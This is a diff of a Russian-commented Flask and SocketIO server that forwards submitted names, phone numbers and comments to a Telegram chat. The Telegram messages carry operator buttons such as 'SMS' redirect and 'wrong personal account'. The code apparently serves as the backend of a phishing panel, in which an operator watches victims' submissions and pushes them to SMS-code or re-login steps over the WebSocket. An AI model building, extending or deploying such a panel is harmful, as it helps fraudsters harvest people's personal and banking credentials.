@@ -1,49 +1,41 @@
+import eventlet
+eventlet.monkey_patch()  # Вызов до всех импортов!
+
 import os
 import requests
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from flask_socketio import SocketIO
 
-# ✅ Создаём Flask-приложение
+# Создание приложения Flask
 app = Flask(__name__)
 CORS(app)
 
-# ✅ Настройки WebSocket (Используем `async_mode="threading"`)
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
+# Настройка SocketIO с использованием eventlet
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
-# ✅ Переменные окружения
+# Загрузка переменных окружения
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
-
 if not TELEGRAM_BOT_TOKEN or not CHAT_ID:
     raise ValueError("❌ Ошибка: TELEGRAM_BOT_TOKEN или CHAT_ID не установлены!")
 
+CHAT_ID = int(CHAT_ID)
 print(f"✅ Загружен TELEGRAM_BOT_TOKEN: {TELEGRAM_BOT_TOKEN[:5]}...")
 print(f"✅ Загружен CHAT_ID: {CHAT_ID}")
 
-# ✅ Главная страница (Теперь `/` не отдаёт 404)
+# Простой маршрут для проверки
 @app.route("/", methods=["GET"])
 def home():
     return jsonify({"status": "OK", "message": "Сервер работает!"}), 200
 
-# ✅ Обработчик WebSocket-соединений
-@socketio.on("connect")
-def handle_connect():
-    print("✅ WebSocket подключен!")
-
-@socketio.on("disconnect")
-def handle_disconnect():
-    print("❌ WebSocket отключен!")
-
-# ✅ Обработчик ошибок WebSocket
-@socketio.on_error()
-def handle_socket_error(e):
-    print(f"⚠ Ошибка WebSocket: {e}")
-
-# ✅ Функция для отправки сообщений в Telegram
+# Функция для отправки сообщения в Telegram
 def send_telegram_message(data):
     try:
-        message_text = f"📩 Новый запрос:\n\nИмя: {data.get('name')}\nТелефон: {data.get('phone')}\nКомментарий: {data.get('comment')}"
+        message_text = (
+            f"📩 Новый запрос:\n\nИмя: {data.get('name')}\n"
+            f"Телефон: {data.get('phone')}\nКомментарий: {data.get('comment')}"
+        )
         keyboard = {
             "inline_keyboard": [
                 [{"text": "SMS", "callback_data": "redirect_sms"},
@@ -60,49 +52,51 @@ def send_telegram_message(data):
                  {"text": "❌ Неверный ЛК", "callback_data": "wrong_lk"}]
             ]
         }
-
         payload = {
             "chat_id": CHAT_ID,
             "text": message_text,
             "reply_markup": keyboard
         }
-
-        print(f"📩 Отправляем в Telegram: {payload}")  # Логирование перед отправкой
-
+        # Используем repr для логирования, чтобы избежать потенциальной рекурсии в форматировании
+        print("📩 Отправляем в Telegram: " + repr(payload))
         response = requests.post(
             f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
             json=payload,
-            timeout=10  # Ограничение времени запроса
+            timeout=10
         )
-
         response_data = response.json()
         print(f"📩 Ответ Telegram: {response_data}")
-
         return response_data
     except Exception as e:
         print(f"❌ Ошибка отправки в Telegram: {e}")
         return {"ok": False, "error": str(e)}
 
-# ✅ Обработчик POST-запроса
+# Обработчик запроса /send-to-telegram
 @app.route("/send-to-telegram", methods=["POST"])
-def send_to_telegram():
+def handle_send_to_telegram():
     try:
         data = request.json
         print(f"📩 Получены данные: {data}")
-
         if not data or "name" not in data or "phone" not in data:
             return jsonify({"error": "Недостаточно данных"}), 400
-
-        # ✅ Вызов функции отправки сообщения в Telegram
         response = send_telegram_message(data)
-
         return jsonify(response)
     except Exception as e:
         print(f"❌ Ошибка сервера: {e}")
         return jsonify({"error": str(e)}), 500
 
-# ✅ Запуск сервера
+# WebSocket обработчики
+@socketio.on("connect")
+def handle_connect():
+    print("✅ WebSocket подключен!")
+
+@socketio.on("disconnect")
+def handle_disconnect():
+    print("❌ WebSocket отключен!")
+
+@socketio.on_error()
+def handle_socket_error(e):
+    print(f"⚠ Ошибка WebSocket: {e}")
+
 if __name__ == "__main__":
     socketio.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=False)
-
-
